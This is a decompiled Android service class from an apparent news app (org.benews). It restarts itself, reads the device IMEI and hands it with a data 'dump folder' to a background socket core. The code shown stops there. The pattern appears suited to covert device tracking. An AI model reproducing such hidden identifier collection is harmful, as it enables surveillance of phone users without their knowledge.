package org.benews;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.support.v4.content.LocalBroadcastManager;
import android.telephony.TelephonyManager;
import android.util.Log;
/* loaded from: classes.dex */
public class PullIntentService extends Service {
    private static final String TAG = "PullIntentService";
    private BackgroundSocket core;
    private String imei;
    private String saveFolder;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return 1;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        Intent mServiceIntent = new Intent(getApplicationContext(), PullIntentService.class);
        getApplicationContext().startService(mServiceIntent);
        int perm = getApplicationContext().checkCallingPermission("android.permission.INTERNET");
        if (perm != 0) {
            Log.d(TAG, "Permission INTERNET not acquired");
        }
        int perm2 = getApplicationContext().checkCallingPermission("android.permission.READ_PHONE_STATE\"");
        if (perm2 != 0) {
            Log.d(TAG, "Permission READ_PHONE_STATE not acquired");
        }
        int perm3 = getApplicationContext().checkCallingPermission("android.permission.WRITE_EXTERNAL_STORAGE");
        if (perm3 != 0) {
            Log.d(TAG, "Permission WRITE_EXTERNAL_STORAGE not acquired");
        }
        PackageManager m = getPackageManager();
        String s = getPackageName();
        try {
            PackageInfo p = m.getPackageInfo(s, 0);
            this.saveFolder = p.applicationInfo.dataDir;
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
            this.imei = telephonyManager.getDeviceId();
        } catch (PackageManager.NameNotFoundException e) {
            Log.w(TAG, "Error Package name not found ", e);
        }
        this.core = BackgroundSocket.newCore(this);
        this.core.setDumpFolder(this.saveFolder);
        this.core.setSerializeFolder(getApplicationContext().getFilesDir());
        this.core.setImei(this.imei);
        this.core.setAssets(getResources().getAssets());
        this.core.Start();
        Intent intent = new Intent(BackgroundSocket.READY);
        intent.putExtra("message", "data");
        LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
    }
}
